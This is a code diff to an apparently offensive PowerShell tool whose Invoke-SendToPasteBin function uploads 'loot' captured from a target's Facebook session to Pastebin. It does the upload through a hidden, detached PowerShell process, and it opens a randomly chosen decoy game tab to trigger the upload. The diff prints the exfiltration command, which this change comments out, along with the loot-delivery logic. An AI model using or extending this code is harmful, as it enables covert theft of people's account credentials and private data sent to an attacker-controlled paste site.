@@ -304,7 +304,7 @@ function Invoke-SendToPasteBin ()
       Helper - 🔥 Send loot(s) to pastebin website 🔥
 
    .DESCRIPTION
-      Pastebin_Title_Example: Facebook_adsufh
+      Pastebin_Title_Example: 1_dsreds_Facebook
       Remark: pastebin webserver only accepts 20 pastes per day! (free account)
       Remark: SendToPasteBin function sends loot's to pastebin in 2 diferent ways:
       1 - Target user switchs from facebook tab to a diferent tab => SendToPasteBin
@@ -337,7 +337,7 @@ function Invoke-SendToPasteBin ()
          cd $Env:TMP
          $RawData = (Get-Content -Path "$PasteThisFile" -EA SilentlyContinue)
          ## Execute Out-PasteBin cmdlet in a hidden console detach from parent process [SocialMedia process pid]
-         Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\Out-PasteBin.ps1 -Force;Out-Pastebin -InputObject '$RawData' -PasteTitle '$PasteTitle' -ExpiresIn 1W -Visibility Private -PastebinUsername '$PastebinUsername' -PastebinPassword '$PastebinPassword' -PastebinDeveloperKey '$PastebinDeveloperKey'"
+         #Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\Out-PasteBin.ps1 -Force;Out-Pastebin -InputObject '$RawData' -PasteTitle '$PasteTitle' -ExpiresIn 1W -Visibility Private -PastebinUsername '$PastebinUsername' -PastebinPassword '$PastebinPassword' -PastebinDeveloperKey '$PastebinDeveloperKey'"
          Start-Sleep -Seconds 5;write-host "  🎖️ Loot file deliver to pastebin server!" -ForegroundColor Blue
          Start-Sleep -Seconds 2
          cd $IPath
@@ -566,8 +566,15 @@ If($Mode -iMatch '^(stop)$')
    ## SendToPasteBin function
    If($SendToPasteBin.IsPresent)
    {
+      $UriList = @(
+         "https://elgoog.im/pacman",
+         "https://elgoog.im/terminal",
+         "https://elgoog.im/space-invaders"
+      )
+
+      $UriToInvoke = (Get-Random -InputObject $UriList)
       ## ⛑️ Open new tab to invoke SendToPasteBin
-      cmd /R start /max "https://elgoog.im/pacman"
+      cmd /R start /max "$UriToInvoke"
       Start-Sleep -Seconds 5
    }
 
